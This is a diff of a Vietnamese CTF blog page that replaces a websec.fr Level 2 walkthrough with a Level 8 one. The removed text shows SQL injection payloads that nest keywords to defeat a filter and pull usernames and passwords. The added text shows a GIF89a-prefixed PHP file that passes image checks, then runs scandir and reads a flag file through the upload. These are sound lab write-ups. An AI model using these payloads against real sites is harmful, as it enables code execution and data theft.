@@ -16,28 +16,31 @@
   <meta name="author" content="Khado">
   <meta name="keywords" content="">
   
-    <meta name="description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level02&#x2F;index.php  Gathering information Challenge này cũng giống tương tự như Level 1. Tuy nhiên, có thêm 1 hàm preg_replace() để filter các từ như union, order, select, from, grou">
+    <meta name="description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level08&#x2F;index.php  Gathering informationChallenge này liên quan đến kiến thức Upload File và GIF. GIF là gì?  GIF viết tắt của từ Graphics Interchange Format. Nôm na tiếng Việt gọi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[WebSec] Level 2">
-<meta property="og:url" content="https://dovankha.github.io/2022/08/05/level2/index.html">
+<meta property="og:title" content="[WebSec] Level 8">
+<meta property="og:url" content="https://dovankha.github.io/2022/08/07/level8/index.html">
 <meta property="og:site_name" content="Khado">
-<meta property="og:description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level02&#x2F;index.php  Gathering information Challenge này cũng giống tương tự như Level 1. Tuy nhiên, có thêm 1 hàm preg_replace() để filter các từ như union, order, select, from, grou">
+<meta property="og:description" content="https:&#x2F;&#x2F;websec.fr&#x2F;level08&#x2F;index.php  Gathering informationChallenge này liên quan đến kiến thức Upload File và GIF. GIF là gì?  GIF viết tắt của từ Graphics Interchange Format. Nôm na tiếng Việt gọi">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/home.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/error.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/sql_struct.png">
-<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/flag.png">
-<meta property="article:published_time" content="2022-08-05T08:01:02.000Z">
-<meta property="article:modified_time" content="2022-08-05T15:26:19.290Z">
+<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/homloi.png">
+<meta property="og:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/folder.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/no_kq.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/debug.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/1.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/scandir.png">
+<meta property="og:image" content="https://dovankha.github.io/CTF/WebSec/lv2/flag.png">
+<meta property="article:published_time" content="2022-08-07T04:19:52.000Z">
+<meta property="article:modified_time" content="2022-08-07T09:32:44.548Z">
 <meta property="article:author" content="Khado">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="easy">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/home.png">
+<meta name="twitter:image" content="https://dovankha.github.io/img/CTF/WebSec/lv2/homloi.png">
   
   
   
-  <title>[WebSec] Level 2 - Khado</title>
+  <title>[WebSec] Level 8 - Khado</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[WebSec] Level 2"></span>
+            <span id="subtitle" data-typed-text="[WebSec] Level 8"></span>
           
         </div>
 
@@ -213,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-05 15:01" pubdate>
-          August 5, 2022 pm
+        <time datetime="2022-08-07 11:19" pubdate>
+          August 7, 2022 am
         </time>
       </span>
     
@@ -225,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k words
+          3k words
         
       </span>
     
@@ -236,7 +239,7 @@
         
         
         
-          18 mins
+          26 mins
         
       </span>
     
@@ -274,41 +277,61 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[WebSec] Level 2</h1>
+            <h1 style="display: none">[WebSec] Level 8</h1>
             
             
               <div class="markdown-body">
                 
                 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://websec.fr/level02/index.php">https://websec.fr/level02/index.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://websec.fr/level08/index.php">https://websec.fr/level08/index.php</a></p>
 </blockquote>
-<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p><img src="/img/CTF/WebSec/lv2/home.png" srcset="/img/loading.gif" lazyload alt="Main info"></p>
-<p>Challenge này cũng giống tương tự như <a href="https://dovankha.github.io/2022/07/19/Level1/">Level 1</a>. Tuy nhiên, có thêm 1 hàm <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.preg-replace.php">preg_replace()</a> để filter các từ như <code>union</code>, <code>order</code>, <code>select</code>, <code>from</code>, <code>group</code>, <code>by</code>. </p>
-<h4 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a><strong>Source code</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelTwo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;leveltwo.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br><br>        <span class="hljs-variable">$searchWords</span> = <span class="hljs-title function_ invoke__">implode</span> ([<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;group&#x27;</span>, <span class="hljs-string">&#x27;by&#x27;</span>], <span class="hljs-string">&#x27;|&#x27;</span>);<br>        <span class="hljs-variable">$injection</span> = <span class="hljs-title function_ invoke__">preg_replace</span> (<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$searchWords</span> . <span class="hljs-string">&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$injection</span>);<br><br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span> (<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span> (SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$lt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LevelTwo</span> ();<br>    <span class="hljs-variable">$userDetails</span> = <span class="hljs-variable">$lt</span>-&gt;<span class="hljs-title function_ invoke__">doQuery</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Challenge này liên quan đến kiến thức <code>Upload File</code> và <code>GIF</code>.</p>
+<p><em><strong>GIF là gì?</strong></em></p>
+<blockquote>
+<p>GIF viết tắt của từ Graphics Interchange Format. Nôm na tiếng Việt gọi là ảnh động. </br> Có đuôi file là .gif và phần signature của file là GIF89a. </br> Trong đó: GIF8 là mã signature, còn 9a là version của file GIF đó.</p>
+</blockquote>
+<p>Các bạn có thể tham khảo thêm GIF Signature Format <a target="_blank" rel="noopener" href="https://www.file-recovery.com/gif-signature-format.htm">tại đây</a>.</p>
+<h4 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a><strong>Source code</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$uploadedFile</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%1$s/%2$s&#x27;</span>, <span class="hljs-string">&#x27;/uploads&#x27;</span>, <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) . <span class="hljs-string">&#x27;.gif&#x27;</span>);<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span> (<span class="hljs-variable">$uploadedFile</span>)) &#123; <span class="hljs-title function_ invoke__">unlink</span> (<span class="hljs-variable">$uploadedFile</span>); &#125;<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &lt;= <span class="hljs-number">50000</span>) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">getimagesize</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) !== <span class="hljs-literal">false</span>) &#123;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) === IMAGETYPE_GIF) &#123;<br>				<span class="hljs-title function_ invoke__">move_uploaded_file</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadedFile</span>);<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#x27;</span> . <span class="hljs-variable">$uploadedFile</span> . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>. <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) . <span class="hljs-string">&#x27;&lt;/a&gt;:&lt;/p&gt;&#x27;</span>;<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>				<span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$uploadedFile</span>);<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>				<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$uploadedFile</span>);<br>			&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#x27;</span>; &#125;<br>		&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#x27;</span>; &#125;<br>	&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#x27;</span>; &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>Quan sát thấy dòng 11, sử dụng query nối chuỗi bởi biến <code>$injection</code>. Từ chỗ này, mình có thể ngắt query và chèn payloads của mình vào để khai thác.</p>
-<p>Hoặc mình nhập vào dấu <code>&#39;</code> thì trang web sẽ báo lỗi như hình dưới, từ đó mình xác định được lỗi SQLi.</p>
-<p><img src="/img/CTF/WebSec/lv2/error.png" srcset="/img/loading.gif" lazyload alt="Error"></p>
+<p>Đọc source code phía trên, ta thấy có 3 điều kiện để upload file thành công.</p>
+<ol>
+<li>Size file để upload không được quá 50kb (50000 bytes).</li>
+<li>File đó phải là file GIF.</li>
+<li>File đó không được rỗng.</li>
+</ol>
+<p>Mình đã thử upload các file thông thường nhưng chưa vượt qua 3 điều kiện trên đó (có lẽ vì file GIF download từ Google về quá nặng).</p>
+<p><img src="/img/CTF/WebSec/lv2/homloi.png" srcset="/img/loading.gif" lazyload alt="Upload không thành công"></p>
 <hr>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Đầu tiên phải xác định được query select mấy cột. </p>
-<p>Nhìn vào <code>query</code> dòng 11 mình xác định 2 cột được <code>select</code> là <code>id</code> và <code>username</code>.</p>
-<p>Mình có thể xác định cấu trúc sql được dùng bằng cách.</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">from</span> sqlite_master;<br></code></pre></td></tr></table></figure>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Trước khi đểể khai thác được bài này thì mình phải xác định là sẽ upload 1 file có chứa các dòng code PHP bên trong file đó (tạm gọi là shell PHP).</p>
+<p>Để ý hàm <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.getimagesize.php">getimagesize()</a> nó sẽ trả về giá trị khác <code>false</code> thì mới được.</p>
+<p>Cùng debug hàm <code>getimagesize()</code> này để xem cách hoạt động của nó ra sao?</p>
+<p>Mình sẽ chuẩn bị 2 file trong cùng một thư mục có tên là <code>1.php</code> và <code>getimagesize.php</code> với nội dung sau.</p>
+<p><img src="/img/CTF/WebSec/lv2/folder.png" srcset="/img/loading.gif" lazyload alt="Thư mục chứa files"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>Tuy nhiên, nếu dùng các từ khoá như <code>select</code>, <code>from</code>, … thì sẽ bị <code>replace</code> thành kí tự trống (là bị xoá mất luôn). </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$searchWords</span> = <span class="hljs-title function_ invoke__">implode</span> ([<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;group&#x27;</span>, <span class="hljs-string">&#x27;by&#x27;</span>], <span class="hljs-string">&#x27;|&#x27;</span>);<br><span class="hljs-variable">$injection</span> = <span class="hljs-title function_ invoke__">preg_replace</span> (<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$searchWords</span> . <span class="hljs-string">&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$injection</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># getimagesize.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$info</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
 
-<p>Để bypass hàm <code>preg_replace()</code> trong trường hợp trên thì mình dùng phương pháp <code>REPLACED KEYWORDS</code>.</p>
-<p>Ví dụ: <code>seSELECTlect</code> sau khi qua <code>preg_replace()</code> là <code>select</code>.</p>
-<p>Tương tự với các từ khoá cần dùng mà bị <code>replace</code> thì cứ áp dụng vào.</p>
-<p><em><strong>Check sql struct</strong></em></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> unUNIONion seSELECTlect <span class="hljs-keyword">sql</span>,<span class="hljs-number">2</span> frFROMom sqlite_master<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>Sau khi run file <code>getimagesize.php</code> thì kết quả sẽ không ra gì cả.</p>
+<p><img src="/CTF/WebSec/lv2/no_kq.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
+<p>Nhưng nếu mình thêm phần <code>Signature</code> của GIF vào file <code>1.php</code> thì sao?</p>
+<p><em>Mình có thể thêm trực tiếp Signature vào file. Hoặc dùng <a target="_blank" rel="noopener" href="https://hexed.it/">tool online</a></em></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br>GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/CTF/WebSec/lv2/sql_struct.png" srcset="/img/loading.gif" lazyload alt="Sql Struct"></p>
-<p>Bước cuối cùng chỉ cần lấy <code>flag</code> là xong.</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> unUNIONion seSELECTlect username,password frFROMom users<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+<p>Run lại file <code>getimagesize.php</code>, thì đã ra được kết quả. Mặc dù là file <code>php</code> nhưng <code>mime-type</code> là <code>image/gif</code>.</p>
+<p><img src="/CTF/WebSec/lv2/debug.png" srcset="/img/loading.gif" lazyload alt="Nothing"></p>
+<p>Mình có thể bypass qua vòng <code>if</code> thứ 2.</p>
+<p>Tiếp theo mình upload file lên xem server có xử lí không?</p>
+<p><img src="/CTF/WebSec/lv2/1.png" srcset="/img/loading.gif" lazyload alt="Upload file thành công"></p>
+<p>Vậy là server có xử lí code trong file <code>1.php</code>. Việc tiếp theo mình xem trong thư mục hiện tại có những file nào?</p>
+<p>Mình đã thử các <a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/">webshell</a> PHP, tuy nhiên đã bị filter hay chặn gì đó nên không dùng được.</p>
+<p>Thay vì sửa code lại trong file <code>1.php</code> thì mình dùng Burp Suite để sửa code luôn cho nhanh.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/CTF/WebSec/lv2/flag.png" srcset="/img/loading.gif" lazyload alt="Flag"></p>
+<p><img src="/CTF/WebSec/lv2/scandir.png" srcset="/img/loading.gif" lazyload alt="Scandir"></p>
+<p>Đọc file <code>flag.txt</code> là xong. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>)); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/CTF/WebSec/lv2/flag.png" srcset="/img/loading.gif" lazyload alt="Got flag"></p>
 
                 
               </div>
@@ -363,8 +386,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[WebSec] Level 2</div>
-      <div>https://dovankha.github.io/2022/08/05/level2/</div>
+      <div>[WebSec] Level 8</div>
+      <div>https://dovankha.github.io/2022/08/07/level8/</div>
     </div>
     <div class="license-meta">
       
@@ -376,7 +399,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 5, 2022</div>
+          <div>August 7, 2022</div>
         </div>
       
       
@@ -412,18 +435,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/07/level8/" title="[WebSec] Level 8">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[WebSec] Level 8</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/04/level28/" title="[WebSec] Level 28">
-                        <span class="hidden-mobile">[WebSec] Level 28</span>
+                      <a href="/2022/08/05/level2/" title="[WebSec] Level 2">
+                        <span class="hidden-mobile">[WebSec] Level 2</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
